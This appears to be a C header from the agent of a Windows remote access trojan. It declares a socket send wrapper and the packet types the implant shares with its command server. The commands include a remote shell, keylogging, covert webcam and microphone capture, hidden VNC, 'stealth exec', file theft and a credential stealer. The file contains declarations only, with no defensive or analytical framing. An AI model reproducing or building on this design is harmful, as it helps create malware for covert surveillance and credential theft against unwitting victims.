#ifndef CORE_H
#define CORE_H

#include <winsock2.h>
#include <windows.h>

// --- Core Networking & Thread Safety ---

// Global Socket Lock
extern CRITICAL_SECTION g_SocketLock;
extern SOCKET g_Socket;

// Thread-Safe Send Wrapper
// Use this for ALL outgoing data
void SendPacket(unsigned int type, const void* data, int len);

// Packet Types (Must match Server)
#define TYPE_AUTH 1
#define TYPE_SHELL_IN 10
#define TYPE_SHELL_OUT 11
#define TYPE_SCREEN_START 20
#define TYPE_SCREEN_STOP 21
#define TYPE_SCREEN_FRAME 22
#define TYPE_SCREEN_CONFIG 23
#define TYPE_MONITOR_LIST 24
#define TYPE_AGENT_KILL 30
#define TYPE_AGENT_UNINSTALL 31
#define TYPE_AGENT_RESTART 32
#define TYPE_AGENT_UPDATE 33
#define TYPE_INPUT_MOUSE 40
#define TYPE_INPUT_KEY 41
#define TYPE_AUDIO_MIC_START 50
#define TYPE_AUDIO_MIC_STOP 51
#define TYPE_AUDIO_MIC_FRAME 52
#define TYPE_AUDIO_CONFIG 53
#define TYPE_AUDIO_DEV_LIST 54
#define TYPE_AUDIO_SYS_START 55
#define TYPE_AUDIO_SYS_STOP 56
#define TYPE_AUDIO_SYS_FRAME 57
#define TYPE_FILE_LS_REQ 60
#define TYPE_FILE_LS_RES 61
#define TYPE_FILE_DOWN_REQ 62
#define TYPE_FILE_DOWN_RES 63
#define TYPE_FILE_UP_REQ 64
#define TYPE_FILE_DELETE 65
#define TYPE_FILE_MKDIR 66
#define TYPE_CAM_START 70
#define TYPE_CAM_STOP 71
#define TYPE_CAM_FRAME 72
#define TYPE_CAM_CONFIG 73
#define TYPE_CAM_LIST 74
#define TYPE_CAM_LS_RES 75
#define TYPE_PROC_LS_REQ 80
#define TYPE_PROC_LS_RES 81
#define TYPE_PROC_KILL 82
#define TYPE_KEYLOG_START 90
#define TYPE_KEYLOG_STOP 91
#define TYPE_KEYLOG_DATA 92
#define TYPE_OPEN_URL 0x90
#define TYPE_CHAT_INIT 0xA0
#define TYPE_CHAT_MSG 0xA1
#define TYPE_CHAT_EXIT 0xA2
#define TYPE_SYS_INFO 0xB0
#define TYPE_HEARTBEAT 0xB1
#define TYPE_STEALTH_EXEC 0xC0
#define TYPE_HVNC_START 0xD0
#define TYPE_HVNC_STOP 0xD1
#define TYPE_HVNC_FRAME 0xD2
#define TYPE_HVNC_INPUT 0xD3
#define TYPE_HVNC_EXEC 0xD4

#define TYPE_STEALER_EXEC 0xE0
#define TYPE_STEALER_RESULT 0xE1
#define TYPE_STEALER_STATUS 0xE2

// Aliases for compatibility
#define TYPE_AUDIO_MIC_DATA TYPE_AUDIO_MIC_FRAME
#define TYPE_AUDIO_SYS_DATA TYPE_AUDIO_SYS_FRAME

// Packet Header Structure
struct PacketHeader { 
    unsigned int magic; 
    unsigned int type; 
    unsigned int length; 
};

#endif
